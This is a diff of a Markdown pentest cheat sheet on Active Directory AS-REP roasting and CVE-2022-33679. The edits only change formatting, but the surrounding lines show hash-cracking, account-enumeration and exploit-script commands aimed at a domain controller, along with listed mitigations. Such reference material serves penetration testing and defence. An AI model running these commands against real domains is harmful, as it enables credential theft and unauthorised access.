@@ -3,6 +3,7 @@
 > If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting
 
 **Requirements**:
+
 * Accounts with the attribute **DONT_REQ_PREAUTH**
   * Windows/Linux:
     ```ps1
@@ -61,8 +62,8 @@ C:\Rubeus> john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproa
 ```
 
 **Mitigations**: 
-* All accounts must have "Kerberos Pre-Authentication" enabled (Enabled by Default).
 
+* All accounts must have "Kerberos Pre-Authentication" enabled (Enabled by Default).
 
 
 ## Kerberoasting w/o domain account
@@ -90,6 +91,7 @@ The technique is fully explained in this article: [Semperis blog post](https://w
 Research from Project Zero : https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html
 
 **Requirements**:
+
 * Accounts with the attribute **DONT_REQ_PREAUTH**
   * Windows/Linux:
     ```ps1
@@ -100,7 +102,7 @@ Research from Project Zero : https://googleprojectzero.blogspot.com/2022/10/rc4-
     PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
     ```
 
-* using [CVE-2022-33679.py](https://github.com/Bdenneu/CVE-2022-33679)
+* Using [CVE-2022-33679.py](https://github.com/Bdenneu/CVE-2022-33679)
   ```bash
   user@hostname:~$ python CVE-2022-33679.py DOMAIN.LOCAL/User DC01.DOMAIN.LOCAL
   user@hostname:~$ export KRB5CCNAME=/home/project/User.ccache
@@ -108,6 +110,7 @@ Research from Project Zero : https://googleprojectzero.blogspot.com/2022/10/rc4-
   ```
 
 **Mitigations**: 
+
 * All accounts must have "Kerberos Pre-Authentication" enabled (Enabled by Default).
 * Disable RC4 cipher if possible.
 
